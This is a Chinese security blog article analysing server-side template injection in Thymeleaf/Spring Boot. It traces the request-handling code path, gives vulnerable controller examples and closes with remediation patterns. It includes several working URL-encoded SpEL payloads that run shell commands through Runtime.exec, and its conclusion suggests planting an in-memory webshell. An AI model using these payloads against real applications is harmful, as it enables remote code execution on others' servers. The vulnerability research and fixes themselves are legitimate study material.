# Java安全之Thymeleaf SSTI分析

阅读量 **257802**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-02 16:30:03

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## About Thymeleaf

Thymeleaf是SpringBoot中的一个模版引擎，个人认为有点类似于Python中的Jinja2，负责渲染前端页面。

之前写JavaWeb和SSM的时候，前端页面可能会用JSP写，但是因为之前项目都是war包部署，而SpringBoot都是jar包且内嵌tomcat，所以是不支持解析jsp文件的。但是如果是编写纯静态的html就很不方便，那么这时候就需要一个模版引擎类似于Jinja2可以通过表达式帮我们把动态的变量渲染到前端页面，我们只需要写一个template即可。这也就是SpringBoot为什么推荐要使用Thymeleaf处理前端页面了。

## 基础知识

###  片段表达式

Thymeleaf中的表达式有好几种

  * 变量表达式： `${...}`
  * 选择变量表达式： `*{...}`
  * 消息表达： `#{...}`
  * 链接 URL 表达式： `@{...}`
  * 片段表达式： `~{...}`

而这次遇到的是片段表达式(FragmentExpression)： `~{...}`，片段表达式可以用于引用公共的目标片段比如footer或者header

比如在`/WEB-INF/templates/footer.html`定义一个片段，名为copy。`<div th:fragment="copy">`

    
    
    <!DOCTYPE html>
    
    <html xmlns:th="http://www.thymeleaf.org">
    
      <body>
    
        <div th:fragment="copy">
          &copy; 2011 The Good Thymes Virtual Grocery
        </div>
    
      </body>
    
    </html>
    

在另一template中引用该片段`<div th:insert="~{footer :: copy}"></div>`

    
    
    <body>
    
      ...
    
      <div th:insert="~{footer :: copy}"></div>
    
    </body>
    

片段表达式语法：

  1. **~{templatename::selector}** ，会在`/WEB-INF/templates/`目录下寻找名为`templatename`的模版中定义的`fragment`，如上面的`~{footer :: copy}`
  2. **~{templatename}** ，引用整个`templatename`模版文件作为`fragment`
  3. **~{::selector} 或 ~{this::selector}** ，引用来自同一模版文件名为`selector`的`fragmnt`

其中`selector`可以是通过`th:fragment`定义的片段，也可以是类选择器、ID选择器等。

当`~{}`片段表达式中出现`::`，则`::`后需要有值，也就是`selector`。

###  预处理

语法：`__${expression}__`

官方文档对其的解释：

> 除了所有这些用于表达式处理的功能外，Thymeleaf 还具有 _预处理_ 表达式的功能。
>
> **预处理是在正常表达式之前完成的表达式的执行** ，允许修改最终将执行的表达式。
>
> 预处理的表达式与普通表达式完全一样，但被双下划线符号（如`__${expression}__`）包围。

个人感觉这是出现SSTI最关键的一个地方，预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的payload即可达到任意代码执行

## 调试分析

其实大部分都是MVC对request的处理流程，在MVC中是DispatcherServlet拦截请求并分发到Handler处理，那下断点直接定位到DispatcherServlet#doDispatch方法（所有的request和response都会经过该方法）。

![](https://p1.ssl.qhimg.com/t01966ad5a4c1e82736.png)

首先获取到了Handler，之后进入doDispatch方法的实现，这里重点注意下下面3个方法

> 1、ha.handle() ，获取ModelAndView也就是Controller中的return值
>
>
> 2、applyDefaultViewName()，对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI
> path作为mav的值
>
> 3、processDispatchResult()，处理视图并解析执行表达式以及抛出异常回显部分处理

![](https://p0.ssl.qhimg.com/t01e6a1ee10ecf77d9c.png)

###  ha.handle

首先跟进`mv = ha.handle(processedRequest, response, mappedHandler.getHandler());`

调用了/org/springframework/web/servlet/mvc/method/AbstractHandlerMethodAdapter.class#handleInternal，继续跟进

![](https://p3.ssl.qhimg.com/t01bfeaa24baf965848.png)

跳到invokeHandlerMethod方法。这里就是使用Handler处理request并获取ModelAndView

![](https://p2.ssl.qhimg.com/t0157f976e8662d837d.png)

在/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter直接跟进到invokeAndHandle方法

![](https://p4.ssl.qhimg.com/t0170e6390df69c06cb.png)

这里通过invokeForRequest函数，根据用户输入的url，调用相关的controller，并将其返回值`returnValue`，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户。

重点是`returnValue`值是否为`null`，根据Controller写法不同会导致`returnValue`的值存在`null`和`非null`的情况。

![](https://p5.ssl.qhimg.com/t014e52bf0e2d43c380.png)

上面Controller中return的字符串并根据前缀和后缀拼接起来，在templates目录下寻找模版文件

例如下面的Thymeleaf默认配置类文件+Controller，Thymeleaf就会去找`/templates/index.html`

默认配置类文件org/springframework/boot/autoconfigure/thymeleaf/ThymeleafProperties.java

    
    
    @ConfigurationProperties(prefix = "spring.thymeleaf")
    public class ThymeleafProperties {
    
        private static final Charset DEFAULT_ENCODING = StandardCharsets.UTF_8;
    
        public static final String DEFAULT_PREFIX = "classpath:/templates/";
    
        public static final String DEFAULT_SUFFIX = ".html";
    
        /**
         * Whether to check that the template exists before rendering it.
         */
        private boolean checkTemplate = true;
    
        /**
         * Whether to check that the templates location exists.
         */
        private boolean checkTemplateLocation = true;
    
        /**
         * Prefix that gets prepended to view names when building a URL.
         */
        private String prefix = DEFAULT_PREFIX;
    
        /**
         * Suffix that gets appended to view names when building a URL.
         */
        private String suffix = DEFAULT_SUFFIX;
    
        /**
         * Template mode to be applied to templates. See also Thymeleaf's TemplateMode enum.
         */
        private String mode = "HTML";
    
        /**
         * Template files encoding.
         */
        private Charset encoding = DEFAULT_ENCODING;
    

Controller

    
    
    @Controller
    public class IndexController {
    
        @RequestMapping("/index")
            public String test1(Model model){
                model.addAttribute("msg","Hello,Thymeleaf");
    
                return "index";
        }
    }
    

上面这种是returnValue不为null的情况。那如果Controller如下写的话，returnValue的值就会为null

    
    
    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
    

###  applyDefaultViewName

如果ModelAndView值不为null则什么也不做，否则如果`defaultViewName`存在值则会给ModelAndView赋值为defaultViewName，也就是将URI
path作为视图名称（具体逻辑会在后面讲）

![](https://p5.ssl.qhimg.com/t0183acf7ed1f848f97.png)

###  processDispatchResult

获取到`ModelAndView`值后会进入到`processDispatchResult`方法，第1个if会被跳过，跟进第2个if中的render方法

![](https://p5.ssl.qhimg.com/t0195912fef30e1e93d.png)

在`render`方法中，首先会获取mv对象的`viewName`，然后调用`resolveViewName`方法，`resolveViewName`方法最终会获取最匹配的视图解析器。

![](https://p1.ssl.qhimg.com/t0178af80b28d423bd4.png)

跟一下`resolveViewName`方法，这里涉及到两个方法：1、首先通过`getCandidateViews`筛选出`resolveViewName`方法返回值不为null的视图解析器添加到`candidateViews`中;
2、之后通过`getBestView`拿到最适配的解析器，getBestView中的逻辑是优先返回在`candidateViews`存在重定向动作的`view`，如果都不存在则根据请求头中的`Accept`字段的值与`candidateViews`的相关顺序，并判断是否兼容来返回最适配的`View`

![](https://p2.ssl.qhimg.com/t016016cab203a2f25e.png)

getCandidateViews：

![](https://p5.ssl.qhimg.com/t018c050c57eea20b92.png)

getBestView：

![](https://p5.ssl.qhimg.com/t01b9224493a4765ee2.png)

最终返回的是`ThymeleafView`之后`ThymeleafView`调用了`render`方法

![](https://p3.ssl.qhimg.com/t01847128a1824046ad.png)

紧接着调用`renderFragment`

![](https://p4.ssl.qhimg.com/t01f28cf13789c461ea.png)

这里是漏洞触发的关键点之一，该方法在后面首先判断`viewTemplateName`是否包含`::`,若包含则获取解析器,调用`parseExpression`方法将`viewTemplateName`(也就是Controller中最后return的值)构造成片段表达式(`~{}`)并解析执行，跟进`parseExpression`方法。

![](https://p1.ssl.qhimg.com/t01d2a4ce1816a3a6a6.png)

在org/thymeleaf/standard/expression/StandardExpressionParser中调用parseExpression

![](https://p4.ssl.qhimg.com/t01a45817f040c14018.png)

最终在org/thymeleaf/standard/expression/StandardExpressionParser对我们表达式进行解析，首先在`preprocess`方法对表达式进行预处理（这里只要表达式正确就已经执行了我们payload中的命令）并把结果存入`preprocessedInput`,可以看到此时预处理就已经执行了命令，之后再次调用`parse`对预处理的结果`preprocessedInput`进行第二次解析，而第二次解析时，需要语法正确也就是在Thymeleaf中，`~{}`中`::`需要有值才可以获得回显，否则没有回显。

![](https://p4.ssl.qhimg.com/t013af327cfe0382096.png)

在org/thymeleaf/standard/expression/StandardExpressionPreprocessor#preprocess方法中，首先通过正则，将`__xxxx__`中间xxxx部分提取出来，调用execute执行

![](https://p1.ssl.qhimg.com/t01276d7b6e300720e7.png)

跟进execute最终调用org/thymeleaf/standard/expression/VariableExpression#executeVariableExpression使用SpEL执行表达式，触发任意代码执行。

![](https://p3.ssl.qhimg.com/t01d88d695845565462.png)

## 漏洞复现

首先常见的一个payload就是`__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x`，通过`__${}__::.x`构造表达式会由Thymeleaf去执行

###  0x01 templatename

Payload:`lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x`，这里因为最后return的值为`user/__${new
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x/welcome`,无论我们payload如何构造最后都会拼接`/welcome`所以根据前面分析即使不加`.x`依然可以触发命令执行

    
    
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
    

![](https://p4.ssl.qhimg.com/t011f85a8daf07453a8.png)

###  0x02 selector

Contorller ：可控点变为了selector位置

    
    
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }
    

payload

`/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x`

![](https://p3.ssl.qhimg.com/t0120ef6b67a8534498.png)

![](https://p1.ssl.qhimg.com/t016199c33024263d44.png)

其实这里也可以不需要`.x`和`::`也可触发命令执行

poc:

`/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open%20-a%20Calculator").getInputStream()).next()%7d__`

![](https://p0.ssl.qhimg.com/t01e9974e43df59476f.png)

关于回显问题：在0x01与0x02payload注入点不同会导致有无回显，也可以说是controller代码给予我们的可控参数不同，

0x01中可控的是templatename，而0x02中可控的是selector，而这两个地方的注入在最后抛出异常的时候找不到templatename是存在结果回显的而找不到selector不存在结果回显。

![](https://p0.ssl.qhimg.com/t01abfbfe0719bd2ecd.png)

###  0x03 URI path

Controller

    
    
    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
    

payload

因为mav返回值为空，所以viewTemplateName会从uri中获取，直接在`{document}`位置传入payload即可

`http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x`

![](https://p3.ssl.qhimg.com/t017a9381b2d58c7e17.png)

![](https://p1.ssl.qhimg.com/t011e4ba85060ba34cc.png)

###  0x03 构造回显

这里其实和0x01类似，templatename部分可控，没回显的原因在于defaultView中对URI path的处理，我们可以在最后加两个`.`

poc

`/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..`需要注意的是`::`必须放在后面，放在前面虽然可以执行命令，但是没有回显。

![](https://p4.ssl.qhimg.com/t017ee3d753e138c7d2.png)

###  About .x

在0x03中payload最后是必须要`.x`，看一下为什么，之前在`applyDefaultViewName`部分有提到`defaultViewName`这个值，因为mav返回值为空，所以viewTemplateName会从uri中获取，我们看下是如何处理`defaultViewName`的，调试之后发现在`getViewName`方法中调用`transformPath`对URL中的`path`进行了处理

![](https://p4.ssl.qhimg.com/t01fa3c0710899ccdab.png)

重点在于第3个if中`stripFilenameExtension`方法

![](https://p1.ssl.qhimg.com/t0161a4cfc68f37ee76.png)

/org/springframework/util/StringUtils#stripFilenameExtension该方法会对后缀做一个清除

![](https://p0.ssl.qhimg.com/t01dd3a2a41c11a5995.png)

如果我们传入的payload没有`.x`的话，例如`http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::`最后会被处理成`/doc/__${new
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a
calculator").getInputStream())`从而没有了`::`无法进入预处理导致无法执行任意代码。

所以这里即使是在最后只加个`.`也是可以的，不一定必须是`.x`

![](https://p3.ssl.qhimg.com/t01692d49b03a73f1b7.png)

![](https://p3.ssl.qhimg.com/t01d169c3ec49f8c3f2.png)

## 其他姿势

这里列举几个比较新奇的思路，反射之类的就不列举了，改一下表达式中的代码即可。

### 0x01 `::` 位置

除了上面利用`.`替换`.x`以外（ModelAndView为null，从URI中获取viewname）在0x01中`::`的位置也不是固定的，这个看之前的代码逻辑即可知晓，比如可以替换成下面的poc,将`::`放在最前面：

`::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__`

![](https://p1.ssl.qhimg.com/t011f3a1d5ce08af04f.png)

###  0x02 POST方式

这个是在turn1tup师傅的文章中get的

    
    
    POST /path HTTP/1.1
    Host: localhost:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 135
    
    lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
    

![](https://p5.ssl.qhimg.com/t01af6dc57d042b56f9.png)

### 0x03 省略`__`

当Controller如下配置时，可以省略`__`包裹

    
    
    @RequestMapping("/path")
    public String path2(@RequestParam String lang) {
        return lang; //template path is tainted
    }
    

poc，也不局限于用`${}`,用`*{}`也是可以的

    
    
    GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
    Host: localhost:8090
    

![](https://p0.ssl.qhimg.com/t017a296d1742f9d9f8.png)

关于这种方式可以参考：<https://xz.aliyun.com/t/9826#toc-4>

## 修复方案

0x01 配置 `[@ResponseBody](https://github.com/ResponseBody "@ResponseBody")` 或者
`[@RestController](https://github.com/RestController "@RestController")`

这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。

    
    
    @GetMapping("/safe/fragment")
    @ResponseBody
    public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
    }
    

0x02 在返回值前面加上 “redirect:”

这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。

    
    
    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //FP as redirects are not resolved as expressions
    }
    

0x03 在方法参数中加上 HttpServletResponse 参数

由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP
Response，因此不会发生视图名称解析。

    
    
    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }
    

## 结语

关于这个漏洞的话调试下来感觉很巧妙，有很多值得深入挖掘的点，但是个人感觉Thymeleaf平常更多的使用姿势还是在于将变量渲染到前端页面而不是类似于输入模版名称去动态返回模版文件，可能实战遇到的并不会很多吧。再有就是在审计的时候有没有一些可以快速定位到该缺陷的方法，待研究。如果真的遇到了，也没必要过于纠结回显，可以直接打内存马。

## Reference

<https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/>

<https://xz.aliyun.com/t/9826#toc-4>

<http://x2y.pw/2020/11/15/Thymeleaf-%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>

<https://github.com/veracode-research/spring-view-manipulation/>

<https://www.cnblogs.com/fishpro/p/spring-boot-study-restcontroller.html>

<https://paper.seebug.org/1332/>

<https://www.freebuf.com/articles/network/250026.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Zh1z3ven** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254519](/post/id/254519)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [java安全](/tag/java安全)
  * [SSTI](/tag/SSTI)
  * [Thymeleaf](/tag/Thymeleaf)

 **+1** __3赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/vRwu3zzRPhiaer28hCoOic0icQvbQOwPjM5cdicAOaYeg6hOzvzGLyDbJMWjBA3CrmmeZuicbicySTlBC3VP6zhrgt6w/132)
Zh1z3ven

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

